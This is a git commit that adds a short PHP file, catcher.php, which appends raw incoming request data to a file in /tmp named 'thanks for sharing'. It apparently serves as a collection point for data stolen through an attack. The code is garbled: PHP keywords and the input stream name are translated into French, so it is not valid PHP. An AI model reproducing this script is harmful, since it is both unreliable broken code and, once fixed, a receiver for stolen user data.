b596a71caadece865c54c25f9ffd25c0cf3f5d48
z3yk0z <105564432+h4ckerpro@users.noreply.github.com>
2024-10-13 03:24:41 +0200

    Update catcher.php

--- catcher.php
+++ catcher.php
@@ -1,1 +1,11 @@
+<?php
 
+$data = file_get_contents("php://entrée");
+$ret = file_put_contents('/tmp/merci_pour_le_partage.txt', $data, FILE_APPEND | LOCK_EX);
+si($ret === faux) {
+ die('Erreur d'écriture dans le fichier');
+}
+autre {
+ echo "$ret octets écrits dans le fichier";
+}
+?>
